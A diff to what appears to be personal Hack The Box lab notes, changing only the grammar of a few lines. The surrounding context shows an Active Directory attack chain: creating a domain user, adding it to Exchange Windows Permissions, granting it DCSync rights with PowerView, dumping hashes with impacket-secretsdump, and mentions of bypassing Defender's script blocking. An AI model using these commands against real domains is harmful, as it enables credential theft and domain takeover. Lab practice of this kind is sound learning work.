@@ -278,7 +278,7 @@ Or try again above commands. The `Add-DomainGroupMember` access denied. `Add-Dom
 So, looks like tt will fail as defender stop importing the script(PowerView.ps1) here.
 
 ### Follow the video from ippsec as it's more clear for what's happening here
-##### Below are two commands equal to the "First Step". Bypass the blocked importing of PowerView.ps1
+##### Below two commands are equal to the "First Step". Bypass the blocked importing of PowerView.ps1
 1. Create a user that natively belongs to ACCOUNT OPERATORS 
 ```
 net user alvin s3rvice /add /domain
@@ -288,7 +288,7 @@ net user alvin s3rvice /add /domain
 net group "Exchange Windows Permissions" alvin /add /domain
 ```
 
-### DCSync Attack (Below two commands equal to the "Second Step")
+### DCSync Attack (Below two commands are equal to the "Second Step")
 ```
 Import-Module .\PowerView.ps1
 Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'alvin' -TargetIdentity 'htb.local\Domain Admins' -Rights DCSync
@@ -301,7 +301,7 @@ impacket-secretsdump alvin:s3rvice@$IP
 not working, still need to import the powerview successfully to do so.
 Question, how to bypass for import powerview?
 
-There are two ways. One use 4MSI show below. The other one uses the LDAP systax.
+There are two ways. One use 4MSI that shows at the bottom. The other one uses the LDAP systax.
 ```
 Import-Module .\PowerView.ps1
 
